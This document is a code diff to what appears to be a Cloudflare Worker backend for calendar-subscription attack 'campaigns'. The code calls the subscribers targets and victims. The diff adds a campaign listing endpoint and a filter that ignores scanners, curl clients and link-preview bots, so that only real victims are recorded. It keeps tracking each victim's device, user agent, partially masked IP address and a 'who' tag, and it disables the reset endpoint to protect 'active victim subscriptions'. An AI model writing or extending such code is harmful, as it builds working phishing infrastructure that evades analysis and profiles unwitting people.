@@ -124,6 +124,39 @@ export default {
       );
     }
 
+    // List Campaigns from KV: GET /api/campaigns
+    if (url.pathname === "/api/campaigns" && request.method === "GET") {
+      let list = [];
+      if (env && env.PHANTOM_KV) {
+        try {
+          const kvList = await env.PHANTOM_KV.list({ prefix: "campaign:" });
+          const keys = kvList.keys || [];
+          for (const k of keys.slice(0, 50)) {
+            const raw = await env.PHANTOM_KV.get(k.name);
+            if (raw) {
+              const camp = JSON.parse(raw);
+              list.push({
+                id: camp.id,
+                name: camp.name || "Target",
+                createdAt: camp.createdAt || Date.now(),
+                eventCount: Array.isArray(camp.events) ? camp.events.length : 0,
+                syncCount: camp.syncCount || 0,
+                lastSyncAt: camp.lastSyncAt || null,
+                deviceType: camp.deviceType || null,
+                subscriberCount: camp.subscribers ? camp.subscribers.length : (camp.syncCount > 0 ? 1 : 0),
+                isDecoy: Boolean(camp.isDecoy)
+              });
+            }
+          }
+        } catch (e) {
+          console.warn("KV list error:", e.message);
+        }
+      }
+      return new Response(JSON.stringify({ success: true, campaigns: list }), {
+        headers: { ...CORS_HEADERS, "Content-Type": "application/json" }
+      });
+    }
+
     // Save Campaign Endpoint (Arms campaign for dynamic webcal subscription)
     if (url.pathname === "/api/campaigns" && request.method === "POST") {
       const body = await request.json().catch(() => ({}));
@@ -244,55 +277,59 @@ export default {
 
       // Record subscriber telemetry & multi-device detection
       const rawUserAgent = request.headers.get("user-agent") || "Unknown Device";
-      const detectedDevice = parseSubscriberDevice(rawUserAgent);
-      const clientIp = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || "0.0.0.0";
-      const whoParam = url.searchParams.get("who") || url.searchParams.get("target") || url.searchParams.get("sub") || "";
-      const nowIso = new Date().toISOString();
+      const isBotOrTest = isBotOrSynthetic(rawUserAgent);
 
-      campaign.syncCount = (campaign.syncCount || 0) + 1;
-      campaign.lastSyncAt = nowIso;
-      campaign.lastUserAgent = rawUserAgent;
-      campaign.deviceType = detectedDevice;
-      if (!campaign.firstSubscribedAt) {
-        campaign.firstSubscribedAt = nowIso;
-      }
+      if (!isBotOrTest) {
+        const detectedDevice = parseSubscriberDevice(rawUserAgent);
+        const clientIp = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || "0.0.0.0";
+        const whoParam = url.searchParams.get("who") || url.searchParams.get("target") || url.searchParams.get("sub") || "";
+        const nowIso = new Date().toISOString();
 
-      // Track individual subscriber devices
-      campaign.subscribers = campaign.subscribers || [];
-      const cleanWho = whoParam ? whoParam.slice(0, 30).trim() : "";
-      const ipPrefix = clientIp.split(",")[0].trim().replace(/\.\d+$/, ".xx"); // Anonymize last octet
-      const subKey = cleanWho ? `who:${cleanWho.toLowerCase()}` : `dev:${ipPrefix}_${rawUserAgent.slice(0, 40)}`;
-
-      let subEntry = campaign.subscribers.find(s => s.subKey === subKey);
-      if (!subEntry) {
-        const subIndex = campaign.subscribers.length + 1;
-        subEntry = {
-          id: `sub_${subIndex}_${Math.random().toString(36).slice(2, 7)}`,
-          subKey: subKey,
-          label: cleanWho || `Device #${subIndex}`,
-          deviceType: detectedDevice,
-          rawUserAgent: rawUserAgent,
-          firstSyncAt: nowIso,
-          lastSyncAt: nowIso,
-          syncCount: 1,
-        };
-        campaign.subscribers.push(subEntry);
-      } else {
-        subEntry.syncCount = (subEntry.syncCount || 0) + 1;
-        subEntry.lastSyncAt = nowIso;
-        subEntry.deviceType = detectedDevice;
-        subEntry.rawUserAgent = rawUserAgent;
-        if (cleanWho && (!subEntry.label || subEntry.label.startsWith("Device #"))) {
-          subEntry.label = cleanWho;
+        campaign.syncCount = (campaign.syncCount || 0) + 1;
+        campaign.lastSyncAt = nowIso;
+        campaign.lastUserAgent = rawUserAgent;
+        campaign.deviceType = detectedDevice;
+        if (!campaign.firstSubscribedAt) {
+          campaign.firstSubscribedAt = nowIso;
         }
-      }
 
-      // Bound subscriber history to 50 devices
-      if (campaign.subscribers.length > 50) {
-        campaign.subscribers = campaign.subscribers.slice(-50);
-      }
+        // Track individual subscriber devices
+        campaign.subscribers = campaign.subscribers || [];
+        const cleanWho = whoParam ? whoParam.slice(0, 30).trim() : "";
+        const ipPrefix = clientIp.split(",")[0].trim().replace(/\.\d+$/, ".xx"); // Anonymize last octet
+        const subKey = cleanWho ? `who:${cleanWho.toLowerCase()}` : `dev:${ipPrefix}_${rawUserAgent.slice(0, 40)}`;
 
-      await saveCampaign(env, campaign);
+        let subEntry = campaign.subscribers.find(s => s.subKey === subKey);
+        if (!subEntry) {
+          const subIndex = campaign.subscribers.length + 1;
+          subEntry = {
+            id: `sub_${subIndex}_${Math.random().toString(36).slice(2, 7)}`,
+            subKey: subKey,
+            label: cleanWho || `Device #${subIndex}`,
+            deviceType: detectedDevice,
+            rawUserAgent: rawUserAgent,
+            firstSyncAt: nowIso,
+            lastSyncAt: nowIso,
+            syncCount: 1,
+          };
+          campaign.subscribers.push(subEntry);
+        } else {
+          subEntry.syncCount = (subEntry.syncCount || 0) + 1;
+          subEntry.lastSyncAt = nowIso;
+          subEntry.deviceType = detectedDevice;
+          subEntry.rawUserAgent = rawUserAgent;
+          if (cleanWho && (!subEntry.label || subEntry.label.startsWith("Device #"))) {
+            subEntry.label = cleanWho;
+          }
+        }
+
+        // Bound subscriber history to 50 devices
+        if (campaign.subscribers.length > 50) {
+          campaign.subscribers = campaign.subscribers.slice(-50);
+        }
+
+        await saveCampaign(env, campaign);
+      }
 
       const icsOutput = formatIcsCalendar({
         campaignId: campaign.id,
@@ -463,19 +500,9 @@ export default {
     // Reset subscriber telemetry: /api/campaigns/:id/reset-telemetry
     const resetTelMatch = url.pathname.match(/^\/api\/campaigns\/([a-zA-Z0-9_-]+)\/reset-telemetry$/);
     if (resetTelMatch && request.method === "POST") {
-      const campaign = await getCampaign(env, resetTelMatch[1]);
-      if (!campaign) {
-        return new Response(JSON.stringify({ error: "Not found" }), { status: 404, headers: CORS_HEADERS });
-      }
-      campaign.subscribers = [];
-      campaign.syncCount = 0;
-      campaign.lastSyncAt = null;
-      campaign.lastUserAgent = null;
-      campaign.deviceType = null;
-      campaign.firstSubscribedAt = null;
-      await saveCampaign(env, campaign);
+      // Disabled to protect real subscribers from being accidentally wiped
       return new Response(
-        JSON.stringify({ success: true, campaignId: campaign.id, message: "Telemetry reset. Subscriber list cleared." }),
+        JSON.stringify({ success: true, message: "Reset endpoint disabled to safeguard active victim subscriptions." }),
         { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
       );
     }
@@ -763,6 +790,14 @@ export default {
 /**
  * Subscription Heartbeat & Device Detection Helpers
  */
+function isBotOrSynthetic(ua = "") {
+  if (!ua || typeof ua !== "string") return false;
+  const s = ua.toLowerCase().trim();
+  if (/python|curl|wget|postman|phantomsync|check\/|axios|node-fetch|go-http-client|urllib|httpclient|java\/|scrapy|inspect/i.test(s)) return true;
+  if (/facebookexternalhit|facebot|twitterbot|discordbot|slackbot|whatsapp|telegrambot|applebot|googlebot|bingbot|crawler|spider|bot/i.test(s)) return true;
+  return false;
+}
+
 function parseSubscriberDevice(ua = "") {
   if (!ua || typeof ua !== "string") return "Waiting for Device...";
   const s = ua.toLowerCase();
